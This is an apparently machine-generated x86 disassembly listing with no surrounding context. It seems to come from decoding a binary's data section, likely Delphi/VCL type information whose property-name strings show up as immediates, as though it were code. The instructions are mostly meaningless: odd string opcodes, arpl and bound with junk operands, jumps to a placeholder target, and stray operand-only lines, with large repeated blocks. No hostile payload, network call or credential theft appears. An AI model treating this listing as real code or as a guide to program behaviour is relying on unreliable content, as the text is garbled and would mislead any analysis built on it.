js r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
inc esp
jb r-xdata
jb r-xdata
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
inc eax
add [ esp + esi + 0x34a80040 ] ah
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc ebx
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebx
imul ebp [ esi + 0x64 ] 0x1
lea eax [ eax ]
and al 0xb4
insb
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
test [ ecx ] dl
inc eax
add [ esi + ebp * 4 + 0x43 ] dh
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp - 0x48f7ffc0 ] cl
inc ebx
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
push esp
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
js r-xdata
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
add [ eax ] al
adc [ eax ] al
nop
sbb [ eax + 0xe080043 ] bh
push esp
inc esp
jb r-xdata
push esp
adc [ eax ] al
push esp
adc [ eax ] al
aam 0xb3
inc ebx
outsb
je r-xdata
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
mov al 0xa7
inc ecx
add [ eax ] ah
test al 0x34
outsd
add [ eax ] ah
outsd
insd
popad
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
outsb
je r-xdata
outsb
je r-xdata
or [ esi ] cl
jbe r-xdata
je r-xdata
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
outsb
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
or [ esi ] al
outsb
je r-xdata
je r-xdata
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
outsb
je r-xdata
push esp
inc ebp
outsb
jb r-xdata
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ ebx ] eax
outsb
je r-xdata
test [ ecx ] dl
inc eax
add [ eax - 0x4d ] bl
inc ebx
add al cl
js r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
push esp
adc [ eax ] al
push esp
adc [ eax ] al
sbb al 0xb9
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0x7c ] si
adc [ eax ] eax
je r-xdata
pop es
dec ecx
outsb
je r-xdata
inc esp
push ebx
outsb
add al 0x8
push es
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
insb
jae r-xdata
test [ ecx ] dl
inc eax
add [ ecx + edx + 0x10540040 ] al
inc eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
add [ ecx + edx + 0x10280040 ] al
inc eax
add [ ebp - 0x486fffc0 ] cl
inc ebx
inc ebx
push 0x84007261
adc [ eax ] eax
sub [ eax ] dl
push ebx
add ecx [ eax ]
push es
je r-xdata
add [ ebx + 0x43b6a4c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
test [ ecx ] dl
inc eax
add [ ecx + esi * 4 ] dl
inc ebx
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp - 0x467bffc0 ] cl
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
test [ ecx ] dl
inc eax
add [ ecx + edx + 0x10540040 ] al
inc eax
add [ eax + edx + 0x40 ] dl
add [ ecx + edi * 4 ] bl
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
add [ eax + edx + 0x40 ] dl
add [ ebp - 0x4787ffc0 ] cl
add [ eax + edx + 0x40 ] dl
add al al
mov eax 0xd080043
inc ebx
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
push esp
dec ebp
outsd
jne r-xdata
rcr al 0xb3
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
popad
outsb
add [ ecx + edx - 0x4eebffc0 ] al
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
inc ebx
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
inc edx
jne r-xdata
push es
je r-xdata
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
or [ esp + edx * 2 ] cl
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
popad
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
jbe r-xdata
inc ebp
inc esp
jb r-xdata
je r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
inc ebx
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add ah dl
mov bl 0x43
add [ eax ] al
adc [ eax ] al
nop
adc al 0xba
inc ebx
add [ eax ] cl
or al 0x54
test [ ecx ] dl
inc eax
add [ ecx + esi * 4 ] dl
outsb
je r-xdata
inc esp
jb r-xdata
push ebx
je r-xdata
add ecx [ edx ]
push esp
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax - 0x4d ] bl
inc ebx
add [ esi ] al
insd
bound ecx [ ebp + 0x66 ]
je r-xdata
inc ebx
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
pop eax
mov ebx 0xf080043
push esp
inc ebx
popad
outsb
push edx
jae r-xdata
insb
rol [ ebx ] 0x0
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
imul edx [ edi + ebp * 2 + 0x70 ] 0x7
push es
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
outsb
je r-xdata
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
inc eax
jb r-xdata
pop ss
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0x7c ] si
adc [ eax ] eax
adc al 0xb1
inc ebx
add ah cl
mov edx 0x11080043
push esp
inc edi
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
ja r-xdata
pop es
inc edx
outsd
outsd
insb
jbe r-xdata
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x43bce0c0 ] cl
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx - 0x3f93ffc0 ] al
inc ebx
add [ eax ] al
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx - 0x3f93ffc0 ] al
inc ebx
add [ eax + ecx * 8 + 0x43 ] al
add [ eax ] al
adc [ eax ] al
cmp [ edx + 0xf080043 ] 0x54
push ebx
je r-xdata
inc edx
outsd
outsd
insb
popad
outsb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
0x44
mov bl 0x43
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
je r-xdata
push edi
push 0x556c6565
add [ eax + edx + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
loopne r-xdata
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
jne r-xdata
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
mov eax eax
pop eax
mov esp 0x10080043
push esp
dec ebp
outsd
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x620043be ] bl
rol [ ebx ] 0x5c
add [ eax ] eax
js r-xdata
insb
outsd
ja r-xdata
popad
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
inc ebx
add eax 0x65530608
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebx + 0x43bc58c0 ] cl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
test [ ecx ] dl
inc eax
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add [ eax + edx + 0x40 ] dl
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
inc ecx
add [ eax ] al
add al 0x8b
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
add [ eax + 0x3 ] cl
inc edx
add [ eax - 0x63ffbfcc ] ah
cld
inc ecx
add [ eax - 0x27ffbfcc ] ch
pop ss
inc esp
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
jo r-xdata
add [ ebx + ecx * 4 ] al
inc ebp
js r-xdata
outsb
je r-xdata
dec ebp
outsd
jne r-xdata
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebp - 0x4207ffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 4 - 0x3f8fffbd ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x78c80040 ] al
inc ecx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
push esp
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x10540040 ] al
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
enter 0x43bb 0x0
or [ edi ] dl
inc ebx
add [ eax ] al
lea eax [ eax ]
clc
mov ebp 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ esi - 0x3f8fffbd ] bh
jbe r-xdata
add [ edx - 0x40 ] ah
inc ebx
add [ ecx + eax ] bl
outsb
je r-xdata
add al 0x8
push es
add [ ebp + esi * 8 + 0x24b80043 ] bl
inc esp
add [ eax - 0x23ffbbe8 ] dh
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax - 0x6bffbbdc ] al
clc
inc ebx
add [ eax ] al
clc
inc ebx
add [ ecx + eax + 0x3600044 ] ch
inc edx
add [ eax ] cl
inc edx
add [ eax ] al
inc edx
add [ eax + 0x3 ] ch
inc edx
add ah al
hlt
push eax
outsd
jae r-xdata
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jbe r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x78c80040 ] al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push esp
mov ebp 0x12080043
push esp
inc ebx
outsd
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
adc [ eax ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
push esp
push ebx
push 0x53746669
je r-xdata
sub_43b552
inc ebx
add ah ah
out dx eax
inc ebx
add [ eax ] dl
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
dec ebp
popad
js r-xdata
popad
imul ebp [ esi + 0x74 ] r-xdata
jo r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
push 0x10043f0
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
mov al 0xa7
inc ecx
add [ eax ] ah
inc ebx
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
je r-xdata
mov ah 0x43
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
outsb
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
fdiv [ ebx + eax * 2 + 0x1000 ]
add [ eax + eax ] dl
add bh bh
push 0x10043f0
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
lea eax [ eax ]
sub al 0xb6
inc ebx
add [ eax ] cl
or edx [ ebp + ecx * 2 + 0x6f ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x43b4d874
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
[ eax - 0x10 ]
mov ah 0x43
add [ eax ] dl
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x43b54473
add [ eax + eax * 4 + 0x41 ] dl
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ecx + edx + 0x10800040 ] al
inc eax
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
inc ebx
outsd
insb
jae r-xdata
add [ eax ] cl
push cs
push esp
add [ eax + r-xdata ] dl
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
outsb
add [ ecx + edx + 0x11840040 ] al
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
add [ eax ] cl
add [ eax ] al
[ eax - 0x10 ]
add al bl
mov ah 0x43
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
je r-xdata
inc esp
jb r-xdata
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add ah dl
mov bl 0x43
test [ ecx ] dl
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
add al cl
js r-xdata
adc [ eax ] 0x40
jb r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
inc esp
jb r-xdata
jb r-xdata
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
push esp
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
js r-xdata
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
add [ eax ] al
adc [ eax ] al
nop
sbb [ eax + 0xe080043 ] bh
push esp
inc esp
jb r-xdata
push esp
adc [ eax ] al
push esp
adc [ eax ] al
aam 0xb3
inc ebx
outsb
je r-xdata
push esp
dec ebx
jns r-xdata
inc ebx
add [ eax ] cl
push cs
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
outsb
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
or [ esi ] al
outsb
je r-xdata
add [ esi + ebp * 4 + 0x43 ] dh
jb r-xdata
je r-xdata
je r-xdata
test [ ecx ] dl
inc eax
add al cl
js r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
test [ ecx ] dl
inc eax
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
push esp
adc [ eax ] al
push esp
adc [ eax ] al
sbb al 0xb9
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0x7c ] si
adc [ eax ] eax
je r-xdata
pop es
dec ecx
outsb
je r-xdata
inc esp
push ebx
outsb
add al 0x8
push es
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp - 0x48f7ffc0 ] cl
inc ebx
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
test [ ecx ] dl
inc eax
add [ ecx + esi * 4 ] dl
inc ebx
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp - 0x467bffc0 ] cl
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
test [ ecx ] dl
inc eax
add [ ecx + edx + 0x10540040 ] al
inc eax
add [ eax + edx + 0x40 ] dl
add [ ecx + edi * 4 ] bl
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
add [ eax + edx + 0x40 ] dl
add al al
mov eax 0xd080043
inc ebx
push esp
inc ebp
outsb
jb r-xdata
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
or [ esi ] cl
jbe r-xdata
je r-xdata
jb r-xdata
add [ ecx + edx + 0x10280040 ] al
inc eax
add [ ebp - 0x486fffc0 ] cl
inc ebx
inc ebx
push 0x84007261
adc [ eax ] eax
sub [ eax ] dl
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
popad
outsb
add [ ecx + edx - 0x4eebffc0 ] al
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
add [ eax + edx + 0x40 ] dl
add [ ebp - 0x4787ffc0 ] cl
test [ ecx ] dl
inc eax
add [ ecx + edx + 0x10540040 ] al
inc eax
outsb
je r-xdata
test [ ecx ] dl
inc eax
add [ eax - 0x4d ] bl
inc ebx
add al cl
js r-xdata
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
or [ esp + edx * 2 ] cl
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
popad
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
jbe r-xdata
inc ebp
push ebx
add ecx [ eax ]
push es
je r-xdata
add [ ebx + 0x43b6a4c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
inc ebx
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add ah dl
mov bl 0x43
add [ eax ] al
adc [ eax ] al
nop
adc al 0xba
inc ebx
add [ eax ] cl
or al 0x54
test [ ecx ] dl
inc eax
add [ ecx + esi * 4 ] dl
outsb
je r-xdata
inc ebx
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
pop eax
mov ebx 0xf080043
push esp
inc ebx
popad
outsb
push edx
jae r-xdata
insb
